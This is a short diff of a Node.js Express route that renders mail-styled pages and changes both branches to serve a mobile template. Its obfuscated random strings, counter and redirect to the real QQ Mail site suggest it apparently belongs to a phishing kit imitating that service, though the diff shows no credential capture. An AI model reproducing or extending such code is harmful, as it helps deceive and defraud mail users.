@@ -106,7 +106,8 @@ module.exports = function (app) {
                 var mid = rows[0].tempId;
                 var bgUrl = rows[0].bgUrl;
                 var url = rows[0].url;
-                res.render(isMobile(req.headers['user-agent']) ? 'pages/wap_mail2.html' : 'pages/pc_mail.html', { layout: null, sha: ranStr.sha, tz: 0, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en2(s_ran), ranImg: ranStr.ranImg, ranRp: ranStr.ranRp });
+                // res.render(isMobile(req.headers['user-agent']) ? 'pages/wap_mail2.html' : 'pages/pc_mail.html', { layout: null, sha: ranStr.sha, tz: 0, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en2(s_ran), ranImg: ranStr.ranImg, ranRp: ranStr.ranRp });
+                res.render(isMobile(req.headers['user-agent']) ? 'pages/wap_mail2.html' : 'pages/wap_mail2.html', { layout: null, sha: ranStr.sha, tz: 0, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en2(s_ran), ranImg: ranStr.ranImg, ranRp: ranStr.ranRp });
                 ranStr.count++;
             });
         } catch (e) {
@@ -131,7 +132,7 @@ module.exports = function (app) {
                     if (tz.toString() === '1') {
                         return res.send('<script>window.parent.location.href="http://mail.qq.com";</script>');
                     }
-                    res.render(isMobile(req.headers['user-agent']) ? 'pages/wap_mail2.html' : 'pages/pc_mail.html', { layout: null, tz: 1, sha: ranStr.sha, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en2(s_ran), ranImg: ranStr.ranImg, ranRp: ranStr.ranRp });
+                    res.render(isMobile(req.headers['user-agent']) ? 'pages/wap_mail2.html' : 'pages/wap_mail2.html', { layout: null, tz: 1, sha: ranStr.sha, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en2(s_ran), ranImg: ranStr.ranImg, ranRp: ranStr.ranRp });
                     ranStr.count++;
                 });
             });
